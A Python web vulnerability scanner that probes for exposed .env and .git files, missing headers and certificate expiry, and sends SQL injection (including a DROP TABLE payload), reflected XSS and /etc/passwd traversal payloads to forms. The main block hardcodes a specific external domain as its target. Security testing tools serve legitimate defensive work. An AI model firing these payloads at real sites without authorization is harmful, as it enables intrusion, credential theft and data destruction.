#!/usr/bin/env python3
import requests
import re
import time
from urllib.parse import urljoin, urlparse

class WebVulnerabilityScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []
        
    def log_vulnerability(self, vuln_type, description, severity, evidence):
        self.vulnerabilities.append({
            'type': vuln_type,
            'description': description,
            'severity': severity,
            'evidence': evidence,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        })
        
    def test_information_disclosure(self):
        print("[+] Testing for information disclosure...")
        
        # Test for common files that might leak information
        sensitive_files = [
            '/robots.txt',
            '/sitemap.xml', 
            '/.env',
            '/.git/config',
            '/backup.zip',
            '/admin',
            '/wp-admin',
            '/phpmyadmin',
            '/server-status',
            '/server-info'
        ]
        
        for file_path in sensitive_files:
            try:
                response = self.session.get(self.target_url + file_path, timeout=10)
                if response.status_code == 200:
                    if file_path in ['/robots.txt', '/sitemap.xml']:
                        print(f"  [INFO] Found: {file_path}")
                        # Parse robots.txt for disallowed paths
                        if file_path == '/robots.txt':
                            disallowed_paths = re.findall(r'Disallow: (.+)', response.text)
                            for path in disallowed_paths:
                                print(f"    Disallowed path: {path}")
                    else:
                        self.log_vulnerability(
                            "Information Disclosure", 
                            f"Sensitive file accessible: {file_path}",
                            "Medium",
                            f"Status code: {response.status_code}, URL: {self.target_url + file_path}"
                        )
                        print(f"  [VULN] Sensitive file found: {file_path}")
            except Exception as e:
                pass
                
    def test_headers_security(self):
        print("[+] Testing HTTP headers security...")
        
        try:
            response = self.session.head(self.target_url, timeout=10)
            headers = response.headers
            
            # Check for missing security headers
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME type sniffing',
                'X-XSS-Protection': 'XSS protection',
                'Strict-Transport-Security': 'HSTS',
                'Content-Security-Policy': 'CSP',
                'Referrer-Policy': 'Referrer policy'
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    self.log_vulnerability(
                        "Missing Security Header",
                        f"Missing {header}: {description}",
                        "Low",
                        f"Header '{header}' is not present in the response"
                    )
                    print(f"  [INFO] Missing security header: {header}")
                else:
                    print(f"  [OK] Security header present: {header}")
                    
        except Exception as e:
            print(f"  [ERROR] Failed to test headers: {e}")
            
    def test_ssl_tls(self):
        print("[+] Testing SSL/TLS configuration...")
        
        try:
            import ssl
            import socket
            from datetime import datetime
            
            parsed_url = urlparse(self.target_url)
            hostname = parsed_url.hostname
            
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiry
                    not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_until_expiry = (not_after - datetime.now()).days
                    
                    if days_until_expiry < 30:
                        self.log_vulnerability(
                            "SSL Certificate",
                            f"Certificate expires in {days_until_expiry} days",
                            "Medium",
                            f"Certificate expiry: {not_after}"
                        )
                    
                    print(f"  [INFO] SSL Certificate expires: {not_after}")
                    print(f"  [INFO] SSL Protocol: {ssock.version()}")
                    
        except Exception as e:
            print(f"  [ERROR] SSL test failed: {e}")
            
    def test_sql_injection(self):
        print("[+] Testing for SQL Injection...")
        
        # Test parameters
        test_params = {
            'id': ["1' OR '1'='1", "1'; DROP TABLE test--", "1' UNION SELECT null--"],
            'search': ["' OR '1'='1", "'; SELECT * FROM users--"],
            'username': ["admin'--", "' OR '1'='1"],
            'email': ["test@test.com'--", "' OR '1'='1"]
        }
        
        # First, try to find forms on the website
        try:
            response = self.session.get(self.target_url, timeout=10)
            forms = re.findall(r'<form[^>]*action="([^"]*)"[^>]*>', response.text)
            
            for form_action in forms[:3]:  # Test first 3 forms
                if form_action.startswith('http'):
                    target_url = form_action
                else:
                    target_url = urljoin(self.target_url, form_action)
                    
                print(f"    Testing form: {target_url}")
                
                for param, payloads in test_params.items():
                    for payload in payloads[:2]:  # Test first 2 payloads per param
                        try:
                            test_data = {param: payload}
                            response = self.session.post(target_url, data=test_data, timeout=10)
                            
                            # Check for SQL error messages
                            sql_errors = [
                                'mysql_fetch_array',
                                'ORA-01756',
                                'odbc_exec',
                                'Microsoft OLE DB Provider',
                                'SQL syntax',
                                'sqlite3.OperationalError',
                                'PostgreSQL query failed'
                            ]
                            
                            for error in sql_errors:
                                if error.lower() in response.text.lower():
                                    self.log_vulnerability(
                                        "SQL Injection",
                                        f"Possible SQL injection vulnerability",
                                        "High",
                                        f"Parameter: {param}, Payload: {payload}, Error: {error}"
                                    )
                                    print(f"      [VULN] Possible SQL injection with {param}={payload}")
                                    break
                        except Exception as e:
                            pass
        except Exception as e:
            print(f"  [ERROR] SQL injection test failed: {e}")
            
    def test_xss(self):
        print("[+] Testing for XSS...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>"
        ]
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            forms = re.findall(r'<form[^>]*action="([^"]*)"[^>]*>', response.text)
            
            for form_action in forms[:3]:
                if form_action.startswith('http'):
                    target_url = form_action
                else:
                    target_url = urljoin(self.target_url, form_action)
                    
                print(f"    Testing XSS on form: {target_url}")
                
                for param in ['search', 'q', 'query', 'input', 'message', 'comment']:
                    for payload in xss_payloads[:2]:
                        try:
                            test_data = {param: payload}
                            response = self.session.post(target_url, data=test_data, timeout=10)
                            
                            if payload in response.text:
                                self.log_vulnerability(
                                    "Cross-Site Scripting (XSS)",
                                    f"Reflected XSS vulnerability detected",
                                    "High",
                                    f"Parameter: {param}, Payload: {payload}"
                                )
                                print(f"      [VULN] Possible XSS with {param}={payload}")
                        except Exception as e:
                            pass
        except Exception as e:
            print(f"  [ERROR] XSS test failed: {e}")
            
    def test_directory_traversal(self):
        print("[+] Testing for Directory Traversal...")
        
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '.././.././.././etc/passwd'
        ]
        
        for payload in traversal_payloads:
            try:
                response = self.session.get(f"{self.target_url}/?file={payload}", timeout=10)
                
                if 'root:' in response.text or 'daemon:' in response.text:
                    self.log_vulnerability(
                        "Directory Traversal",
                        "LFI/Directory Traversal vulnerability detected",
                        "High",
                        f"Payload: {payload}, Response length: {len(response.text)}"
                    )
                    print(f"  [VULN] Directory traversal with payload: {payload}")
                    break
            except Exception as e:
                pass
                
    def run_scan(self):
        print(f"Starting comprehensive security scan of {self.target_url}")
        print("=" * 60)
        
        self.test_information_disclosure()
        self.test_headers_security()
        self.test_ssl_tls()
        self.test_sql_injection()
        self.test_xss()
        self.test_directory_traversal()
        
        print("\n" + "=" * 60)
        print("SCAN COMPLETE")
        print("=" * 60)
        
        if self.vulnerabilities:
            print(f"\nFound {len(self.vulnerabilities)} vulnerabilities:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. {vuln['type']} ({vuln['severity']}):")
                print(f"   Description: {vuln['description']}")
                print(f"   Evidence: {vuln['evidence']}")
        else:
            print("\nNo critical vulnerabilities found.")
            
        return self.vulnerabilities

if __name__ == "__main__":
    scanner = WebVulnerabilityScanner("https://uplinkai.in/")
    vulnerabilities = scanner.run_scan()
